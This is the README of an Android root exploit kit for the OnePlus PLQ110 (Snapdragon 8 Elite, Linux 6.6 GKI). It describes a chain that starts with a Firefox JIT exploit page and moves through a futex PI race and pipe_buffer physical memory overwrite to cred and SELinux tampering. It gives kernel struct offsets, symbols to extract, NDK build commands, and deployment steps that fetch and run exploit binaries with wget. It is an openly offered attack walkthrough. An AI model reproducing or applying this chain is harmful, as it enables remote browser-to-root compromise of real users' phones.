# OnePlus PLQ110 (QCOM 6.6 GKI) Root Exploit Kit

> **设备**: OnePlus PLQ110 (OnePlus Ace 5 Pro / OnePlus K3 regional)
> **SoC**: Qualcomm Snapdragon 8 Elite (sm8775 / "sun")
> **内核**: **Linux 6.6.89-android15-8 GKI** (`6.6.89-android15-8-g7e1f3c083cc6-abogki467167594-4k`)
> **Android**: 15
> **生成**: 2026-07-12
> **源码**: https://github.com/NebuSec/CyberMeowfia
> **参考**: `../Lenovo Tab TB330FU/` (MTK 4.19.191)

---

## 1️⃣ 设备信息

| 项目 | 值 |
|------|------|
| 型号 | **OnePlus PLQ110** (CN: Ace 5 Pro / K3 regional) |
| SoC | **Qualcomm Snapdragon 8 Elite** (sm8775 / sun) |
| 内核 | **Linux 6.6.89-android15-8 GKI** (Android Common Kernel 6.6, r510928) |
| 内核构建器 | clang 18.0.0 (`kleaf@build-host`), LLD 18.0.0, +pgo +bolt +lto +mlgo |
| Boot 头 | **ANDROID! v4** (GKI) + **VNDRBOOT v4** (split-boot) |
| Android | 15 (oplus eng layer) |
| 架构 | ARM64 aarch64 |
| 页大小 | **4 KiB** (`abogki...-4k`) |
| VA_BITS | **39** (GKI 默认, 4K 页) |
| 内核基址 | `0xFFFFFFC008000000` (KASLR adds delta) |
| 直接映射 | `0xFFFFFF8000000000 ~ 0xFFFFFFC000000000` |
| vmemmap | `0xFFFFFFE000000000 ~ 0xFFFFFFE200000000` |
| 物理偏移 | `0x80000000` |
| Kernel cmdline | `video=vfb:640x400,bpp=32,memsize=3072000 log_buf_len=2M nosoftlockup console=ttynull qcom_geni_serial.con_enabled=0 nohugevmalloc bootconfig buildvariant=user androidboot.hardware=qcom androidboot.memcg=1 androidboot.usbcontroller=a600000.dwc3 androidboot.load_modules_parallel=true androidboot.hypervisor.protected_vm.supported=true androidboot.vendor.qspa=true androidboot.serialconsole=0` |

### Boot 镜像

仓库 `boot/` 目录已包含 PLQ110 关键镜像（xz 压缩形式，合计 ~16 MB）：

```
boot/
├── boot.img.xz         ~10 MB   GKI kernel + ramdisk (ANDROID! v4)
├── vmlinux.xz          ~4 MB    从 boot.img 提取的 ELF (符号分析用)
├── init_boot.img.xz    ~2 MB    GKI init ramdisk (ANDROID! v4)
├── dtbo.img.xz         ~140 KB  device tree overlay (稀疏)
├── vbmeta.img          12 KB    AVB vbmeta (boot/init_boot)
├── vbmeta_system.img   4 KB     AVB vbmeta (system/system_ext/product)
└── vbmeta_vendor.img   4 KB     AVB vbmeta (vendor/vendor_dlkm/odm)
```

vendor_boot.img（96 MB）和 recovery.img（100 MB）体积过大未包含；如需可从设备
`dd` 提取，详见 `boot/README.md`。

校验 boot header：
```bash
cd boot && xz -d boot.img.xz && xxd boot.img | head -1
# 00000000: 414e 4452 4f49 4421 006a 2f02 ...  ->  ANDROID!
```

---

## 2️⃣ 漏洞利用链

与 Lenovo TB330FU (MTK 4.19) 的利用链结构对齐 — 改变了内核侧 primitive：

```
┌────────────────────────────────────────────────┐
│ Stage 1: Firefox JIT Type Confusion             │
│  CVE-2026-23274 exploit.html (父级目录)         │
│  → AAR / AAW / ADDROF + RWX shellcode           │
│  → pipe + fork + execve("/system/bin/sh -c ...") │
│  → 在 Firefox 沙箱内获取 unprivileged shell     │
├────────────────────────────────────────────────┤
│ Stage 2: QCOM Futex PI Race (本 kit)            │
│  FUTEX_LOCK_PI / FUTEX_CMP_REQUEUE_PI race      │
│  → 8 个子进程 × 300 轮 race                     │
│  → 在 PI chain 中获取内核上下文执行窗口          │
├────────────────────────────────────────────────┤
│ Stage 3: PR_SET_MM_MAP + dma-heap 内存布局篡改  │
│  /dev/dma_heap/system 分配 + mmap (替代 ashmem) │
│  PR_SET_MM_MAP 替换进程 mm 字段                 │
│  → 在目标位置布置伪造数据                       │
├────────────────────────────────────────────────┤
│ Stage 4: Pipe Buffer 物理内存读写               │
│  → 覆盖 pipe_buffer.page 指针                   │
│  → 通过 vmemmap (0xFFFFFFE0_00000000) 定位 page │
│  → 任意物理地址 → 改写 cred                     │
├────────────────────────────────────────────────┤
│ Stage 5: 提权                                    │
│  cred.uid = 0 / cred.caps = ~0                  │
│  SELinux sid → kernel init sid                  │
│  → 安装 su → root shell                         │
└────────────────────────────────────────────────┘
```

### 与 Lenovo TB330FU (MTK 4.19) 的差异

| 项 | Lenovo TB330FU (MTK) | OnePlus PLQ110 (QCOM) |
|----|----------------------|----------------------|
| SoC | MediaTek MTK | **Qualcomm Snapdragon 8 Elite** |
| Kernel | 4.19.191 | **6.6.89-android15-8 GKI** |
| VA_BITS | 39 | **39** (same) |
| Boot header | legacy boot.img | **boot v4 + vendor_boot v4** (GKI split) |
| Heap primitive | **ASHMEM** (`/dev/ashmem`) | **dma-heap** (`/dev/dma_heap/system`) — ASHMEM 在 6.6 GKI 已删除 |
| Struct page 大小 | 0x40 (64B) | 0x40 (64B, 未变) |
| pipe_buffer 大小 | 0x28 (40B) | 0x28 (40B, 未变) |
| struct cred 起始偏移 | (与 6.6 相同) | (相同，但 task_struct.cred 偏移不同) |
| task_struct.tasks | ~0x550 | **~0x5D8** (6.6 grew) |
| task_struct.cred | ~0x850 (4.19 est) | **~0x850** (6.6 typical) |
| task_struct.pid | ~0x618 | **~0x6A8** |
| vmemmap 基址 | 0xFFFFFFC000000000 (target.h 中, 错误) | **0xFFFFFFE000000000** (数学正确) |
| KASLR leak 符号 | nfulnl_logger / boot_id | 同 (6.6 仍保留) |
| MTE | n/a | **CONFIG_ARM64_MTE=y** (Qualcomm 启用) |
| KASLR | 静态 + optional | **always on (CONFIG_RANDOMIZE_BASE=y)** |

---

## 3️⃣ 关键内存布局 (ARM64 VA_BITS=39, 4K 页, Linux 6.6 GKI)

Linux 6.6 `arch/arm64/include/asm/memory.h`:
```c
#define VA_BITS             CONFIG_ARM64_VA_BITS                  // 39
#define _PAGE_OFFSET(va)    (-(UL(1) << (va)))
#define PAGE_OFFSET         (_PAGE_OFFSET(VA_BITS))               // 0xFFFFFF8000000000
#define VMEMMAP_START       (-(UL(1) << (VA_BITS - VMEMMAP_SHIFT)))
//  VMEMMAP_SHIFT = STRUCT_PAGE_MAX_SHIFT = 6  (struct page = 64 bytes)
//  VMEMMAP_START = -(1UL << (39 - 6)) = -(1UL << 33) = 0xFFFFFFE000000000
```

```
用户空间:   0x0000000000000000 ~ 0x0000007FFFFFFFFF
内核空间:   0xFFFFFF8000000000 ~ 0xFFFFFFFFFFFFFFFF
  ├─ 直接映射 (linear): 0xFFFFFF8000000000 ~ 0xFFFFFFC000000000  (64 GB)
  ├─ kernel text + module region: 0xFFFFFFC000000000 ~ 0xFFFFFFE000000000
  │     └─ KIMAGE base: 0xFFFFFFC008000000 + KASLR delta
  ├─ vmemmap (struct page[]): 0xFFFFFFE000000000 ~ 0xFFFFFFE200000000 (8 GB)
  ├─ fixmap / PCI I/O
  └─ vectors / trampolines
```

### Page 结构体 (Linux 6.6 ARM64)

```
struct page (ARM64, 6.6, FLATMEM):       大小 0x40 (64 字节)
  flags        @ 0x00   (unsigned long, 8B)
  union {
    compound_head / folio   @ 0x08   (8B)
    slab_cache              @ 0x08   (when !PageCompound)
  }
  _refcount     @ 0x10  (atomic_t in 6.6, formerly at 0x10/0x18)
  ...
  type/slab_flags @ 0x30
```

vmemmap 索引公式（VA_BITS=39, struct page=64B）:
```
page_vaddr = VMEMMAP_START + pfn * sizeof(struct page)
           = 0xFFFFFFE000000000ULL + pfn * 0x40
```

---

## 4️⃣ 结构体偏移 (Linux 6.6 ARM64, ACK)

### struct cred (6.6, CONFIG_KEYS=y, no DEBUG_CREDENTIALS)

```
offset 0:    usage          (atomic_t, 4B)
offset 4:    uid            (kuid_t, 4B)
offset 8:    gid            (kgid_t, 4B)
offset 12:   suid           (kuid_t, 4B)
offset 16:   sgid           (kgid_t, 4B)
offset 20:   euid           (kuid_t, 4B)
offset 24:   egid           (kgid_t, 4B)
offset 28:   fsuid          (kuid_t, 4B)
offset 32:   fsgid          (kgid_t, 4B)
offset 36:   securebits     (unsigned int, 4B)
offset 40:   cap_inheritable (kernel_cap_t, 8B)
offset 48:   cap_permitted   (kernel_cap_t, 8B)
offset 56:   cap_effective   (kernel_cap_t, 8B)
offset 64:   cap_bset        (kernel_cap_t, 8B)
offset 72:   cap_ambient     (kernel_cap_t, 8B)
offset 80:   jit_keyring    (u8, 1B + 7 padding)
offset 88:   session_keyring (struct key*, 8B)
offset 96:   process_keyring (struct key*, 8B)
offset 104:  thread_keyring  (struct key*, 8B)
offset 112:  request_key_auth (struct key*, 8B)
offset 120:  security       (void*, 8B)   ← SELinux/LSM blob
offset 128:  user           (struct user_struct*, 8B)
```

### SELinux task_security_struct

```
offset 0:  osid  (u32)
offset 4:  sid   (u32)
```

### struct task_struct (6.6, THREAD_INFO_IN_TASK=y, CONFIG_SECCOMP_FILTER=y)

```
offset 0x000:  thread_info.flags       (volatile unsigned long, 8B)
offset 0x008:  <atomic flags>
offset 0x590:  real_parent             (struct task_struct*)
offset 0x5D8:  tasks                   (struct list_head)
offset 0x6A8:  pid                     (pid_t)
offset 0x6AC:  tgid                    (pid_t)
offset 0x850:  cred                    (const struct cred*)   ← our target
offset 0xBB0:  seccomp
   ├─ 0x00:  mode
   ├─ 0x04:  filter_count
   └─ 0x08:  filter
```

⚠️ task_struct 偏移在 6.6 上因 CONFIG 选项而显著变化。**必须从 vmlinux 用 `pahole -C task_struct vmlinux` 校准**。

### mm_struct

```
大小: ~0x520 (Linux 6.6, 含 maple tree 状态)
slab order: 3 (32KB slab)
```

### pipe_buffer (6.6)

```
struct pipe_buffer {                  每个 0x28 (40 字节)
  struct page     *page;              offset 0x00
  unsigned int    offset;             offset 0x08
  unsigned int    len;                offset 0x0C
  const struct pipe_buf_operations *ops; offset 0x10
  unsigned int    flags;              offset 0x18
  unsigned long   private;            offset 0x20
};
pipe 默认槽位: 16
pipe 最大槽位: 32
```

---

## 5️⃣ CyberMeowfia IonStack 目标偏移

> 源码参考: `CVE-2026-43499/exploit/src/targets/`
>
> 仿照 MTK kit 的 `target/target.h`，**所有符号偏移保留为 0** — 必须在
> 运行时通过 `kernelsnitch` 从 `vmlinux` 中提取（见 §6）。
> 当前 target.h 已定义内存布局基址、struct 偏移、dma-heap ioctl、pipe 偏移。

### 已定义的基址 (`target/target.h`)

```c
#define KIMAGE_TEXT_BASE     0xFFFFFFC008000000ULL
#define P0_PAGE_OFFSET       0xFFFFFF8000000000ULL
#define P0_PHYS_OFFSET       0x80000000ULL
#define VMEMMAP_START        0xFFFFFFE000000000ULL
#define VMEMMAP_END          0xFFFFFFE200000000ULL
#define DIRECT_MAP_BASE      0xFFFFFF8000000000ULL
#define DIRECT_MAP_END       0xFFFFFFC000000000ULL
```

### 需要从 vmlinux 提取的符号 (全部需要 kernelsnitch 在运行时填充)

| 符号 | 用途 |
|------|------|
| `init_task` | 定位 init 进程 cred |
| `init_cred` | 直接获取 root cred (PLQ110 可用) |
| `selinux_enforcing` | 关闭 SELinux enforcing |
| `dma_heap_fops` | 识别 dma_heap 文件操作结构体 (替代 `ashmem_fops`) |
| `kmalloc_caches` | slab 分配器操作 |
| `anon_pipe_buf_ops` | pipe buffer 操作函数表 |
| `security_hook_heads` | LSM 钩子表 |
| `nfulnl_logger` | KASLR 滑动探测 |
| `random_boot_id_data` | KASLR 滑动探测 |
| `sysctl_bootid` | KASLR 滑动探测 |
| `root_task_group` | sched 任务组 |

---

## 6️⃣ 从 vmlinux 提取偏移 (PLQ110)

PLQ110 的 boot.img 使用 **GKI** (Generic Kernel Image)，内核是 arm64 Image 格式，
**未带符号表** (stripped)。完整符号表需要从 debug kernel 或 symbols package 获取。

> ⚠️ **重要**：实测确认 PLQ110 GKI 内核 `nm vmlinux` 返回空 — symtab 在 build 时
> 被 strip 了。符号地址只能通过运行时 `/proc/kallsyms`（需要先 root）或上游 debug
> symbols 包获得。详见下方"运行时提取"小节。

### 步骤 1: 解压 boot.img / vmlinux

仓库 `boot/` 已附带压缩好的 `boot.img.xz` 和提取出的 `vmlinux.xz`：

```bash
cd boot
xz -dk boot.img.xz       # 解压出 boot.img (~96 MB)
xz -dk vmlinux.xz        # 解压出 vmlinux (~18 MB)
file boot.img vmlinux
# boot.img:  Android bootimg v4 ...
# vmlinux:   ELF 64-bit LSB shared object, ARM aarch64, stripped
```

如需从 boot.img 重新提取 vmlinux（例如验证完整性）：

```bash
python3 ../../tools/unpack_boot_pybootimg.py boot.img ./unpack-out
# 产物: ./unpack-out/kernel (arm64 Image, ~36MB)
#       ./unpack-out/vmlinux (嵌入 ELF, ~18MB)
```

### 步骤 2 (离线，符号表未 stripped 时可用)

```bash
# 内核版本（这一步即使 stripped 也能拿到）
strings vmlinux | grep "Linux version"
# 预期: Linux version 6.6.89-android15-8-g7e1f3c083cc6-abogki467167594-4k ...

# ⚠️ 以下命令对 stripped 内核返回空 — 跳到"运行时提取"
nm vmlinux | grep -E " (init_task|init_cred|selinux_enforcing|anon_pipe_buf_ops|kmalloc_caches|nfulnl_logger|security_hook_heads|root_task_group)$"
```

### 步骤 2 (运行时，GKI stripped 内核必须用此)

利用浏览器 JIT 漏洞获取 shell 后，从设备读取 `/proc/kallsyms`：

```bash
# 在浏览器漏洞利用成功后的 shell 中
cat /proc/kallsyms | grep -E " (init_task|init_cred|selinux_enforcing|anon_pipe_buf_ops|kmalloc_caches|nfulnl_logger|security_hook_heads|root_task_group)$"
```

注意：未特权进程读 `/proc/kallsyms` 通常只能看到 `0000000000000000` 占位地址（kptr_restrict）。
**先成功执行 KASLR 泄漏或部分提权才能拿到真实地址。**

### 步骤 3: 填入 target/target.h

将上一步得到的偏移（符号 VMA - `KIMAGE_TEXT_BASE` = `0xFFFFFFC008000000`）填入
`target/target.h` 中对应的 `_OFF` 宏定义。所有值为 0 的 `*_OFF` 宏（除显式注释为
n/a 的）都需要填入。

```bash
python3 -c "
vma = 0xffffffc008123456   # 示例: init_task 的 kallsyms 输出
base = 0xffffffc008000000
print(hex(vma - base))
"
```

### 步骤 4 (可选): 用 pahole 校准结构体偏移

```bash
# 需要 debug kernel (带 BTF / DWARF) — 通常需向 OEM 索取
pahole -C task_struct vmlinux | head -40
pahole -C cred vmlinux
pahole -C pipe_buffer vmlinux
pahole -C mm_struct vmlinux | head -20
```

---

## 7️⃣ 文件清单

```
OnePlus PLQ110/
├── README.md                    ← 本说明文件
│
├── exploit.html                 ← PLQ110 专属入口页 (适配 Firefox 151.0)
│                                  在确认指纹为 PLQ110 后，提供红色按钮
│                                  "运行 QCOM Kernel Exploit" 自动部署
│
├── bin/                         ← (空目录) 编译产物存放处 — 见 bin/README.md
│   └── README.md
│
├── src/                         ← C 源码 (Qualcomm 6.6 适配)
│   ├── qcom_exploit.c           ← Futex PI Race + Pipe PhysRW 主利用 (300+ 行)
│   ├── qcom_offsets.h           ← 6.6 ARM64 内核偏移头文件
│   ├── run_exploit.c            ← exploit 主入口 stub (调用 qcom_exploit_main)
│   ├── kprobe.c                 ← 内核环境探测器 (maps / dma-heap / PR_SET_MM)
│   ├── hello.c                  ← 交叉编译验证
│   ├── test_dma_heap.c          ← /dev/dma_heap/* 测试 (替代 test_ashmem)
│   ├── test_futex.c             ← futex PI 基本可用性测试
│   ├── test_min.c               ← 最小可执行测试
│   └── test_openat.c            ← SELinux 路径访问性测试
│
├── target/
│   └── target.h                 ← CyberMeowfia IonStack PLQ110 目标偏移
│                                  (与 src/qcom_offsets.h 内容对齐)
│
└── boot/
    ├── boot.img.xz              ← 完整 boot.img (GKI kernel + ramdisk)
    ├── vmlinux.xz               ← 提取的 vmlinux ELF (符号分析用)
    ├── init_boot.img.xz         ← GKI init ramdisk
    ├── dtbo.img.xz              ← device tree overlay
    ├── vbmeta*.img              ← AVB vbmeta (3 个分区)
    └── README.md                ← 文件清单 + 解压方法
```

---

## 8️⃣ 编译方式

> ⚠️ `bin/` 目录当前为空。需要使用 Android NDK r26+ 在 Linux/macOS 上编译，
> 然后将产物推送到 `bin/` 目录供 exploit.html 部署。

### 准备 NDK

```bash
# 下载 NDK r26d 或更高 (推荐 r27)
# https://developer.android.com/ndk/downloads
export NDK=$HOME/Android/Sdk/ndk/27.0.12077973
export TOOLCHAIN=$NDK/toolchains/llvm/prebuilt/linux-x86_64
export API=34   # Android 14+, PLQ110 实测可用 API 34/35
export CC=$TOOLCHAIN/bin/aarch64-linux-android$API-clang
export STRIP=$TOOLCHAIN/bin/llvm-strip
```

### 编译单个文件 (PIE)

```bash
cd src

# 主 exploit
$CC -O2 -pie -fPIE -I../target -o ../bin/qcom_exploit \
    qcom_exploit.c -lpthread
$STRIP ../bin/qcom_exploit

# run_exploit wrapper (调用 qcom_exploit_main)
$CC -O2 -pie -fPIE -o ../bin/run_exploit run_exploit.c qcom_exploit.c -lpthread
$STRIP ../bin/run_exploit

# kprobe
$CC -O2 -pie -fPIE -o ../bin/kprobe kprobe.c
$STRIP ../bin/kprobe

# 测试程序
$CC -O2 -pie -fPIE -o ../bin/hello hello.c
$CC -O2 -pie -fPIE -o ../bin/test_dma_heap test_dma_heap.c
$CC -O2 -pie -fPIE -o ../bin/test_futex test_futex.c -lpthread
$CC -O2 -pie -fPIE -o ../bin/test_min test_min.c
$CC -O2 -pie -fPIE -o ../bin/test_openat test_openat.c
```

### 验证产物

```bash
file ../bin/qcom_exploit
# 预期: ELF 64-bit LSB pie executable, ARM aarch64, dynamically linked

# 静态分析 (确认 syscall 编号正确)
$TOOLCHAIN/bin/llvm-objdump -d ../bin/qcom_exploit | grep -c 'svc'
# 预期: > 20 (大量 syscall)
```

---

## 9️⃣ 使用流程

### 端到端

1. **解锁 bootloader** (必需 — OnePlus 设备需先申请解锁)
2. 准备一台已 root 或可调试的电脑，安装 ADB
3. PLQ110 启动到正常系统，安装 Firefox 151.0 (arm64-v8a)
4. 在 Firefox 中访问 `Rootme/CVE-2026-23274/OnePlus PLQ110/exploit.html`
5. 等待浏览器利用完成 (出现红色「运行 QCOM Kernel Exploit」按钮)
6. 点击红色按钮，等待 QCOM Kernel Exploit 自动部署并执行
7. 完成后查看输出，确认 `uid=0(root)`

### 手工部署 (备用)

```bash
# 在浏览器利用成功后，通过 Web 命令行执行
adb shell   # 仅作示意；PLQ110 上需通过浏览器 shell
mkdir -p /data/local/tmp/qcom
cd /data/local/tmp/qcom
# 用 wget 从 exploit.html base url 拉取 (URL 由 exploit.html 决定)
toybox wget -O run_exploit '<exploit-base>/bin/run_exploit'
toybox wget -O qcom_exploit '<exploit-base>/bin/qcom_exploit'
chmod 755 run_exploit qcom_exploit
./kprobe          # 先看内核环境
./run_exploit     # 主利用
id                # 确认 uid=0
```

---

## ⚠️ 警告

- 本 exploit 会修改系统分区 (`/bin/su`, `/data/local/tmp/su`)
- 可能造成设备崩溃、重启、数据丢失
- **仅在你拥有的设备上运行**
- 需要先解锁 bootloader
- 推荐在有完整系统备份的前提下运行
- PLQ110 启用了 CONFIG_ARM64_MTE — 任何未对齐的物理地址访问将立即崩溃
- KASLR 在 6.6 GKI 上**强制启用** — 必须先成功泄漏 slide

---

## 🔧 已知限制 (本模板当前状态)

1. **符号偏移全部为 0** — `target/target.h` 中 `INIT_TASK_OFF`、
   `SELINUX_ENFORCING_OFF`、`DMA_HEAP_FOPS_OFF`、`ANON_PIPE_BUF_OPS_SYM_OFF`、
   `KMALLOC_CACHES_OFF`、`SLIDE_*_OFF` 等所有需要从 vmlinux 提取的偏移均为 0。
   必须按 §6 步骤提取并填入后才能实际利用。

2. **task_struct 偏移为典型值** — `TASK_TASKS_OFF`、`TASK_CRED_OFF`、
   `TASK_PID_OFF`、`TASK_SECCOMP_OFF` 等是 ACK 6.6 的常见值，但每个 build
   可能略有差异。需要用 `pahole` 或 `objdump -d vmlinux` 交叉验证。

3. **dma-heap 路径假设** — `/dev/dma_heap/system` 在大多数 PLQ110 build
   上存在，但 oplus 自定义层可能改路径。`open_dma_heap()` 函数尝试了
   `system`、`system-uncached`、`qcom-system` 三个备选。

4. **PR_SET_MM_MAP 权限** — 未特权进程调用会被 EPERM 拒绝。本 exploit
   假设 Futex PI race 已将进程提升到可绕过该检查的内核上下文 (与 MTK 版
   的假设一致)。

5. **MTE 兼容性** — 若 PLQ110 启用了 MTE 同步模式，伪造的指针可能
   触发 tag fault 而非读取成功。需要在运行时检测 MTE 模式并相应调整。
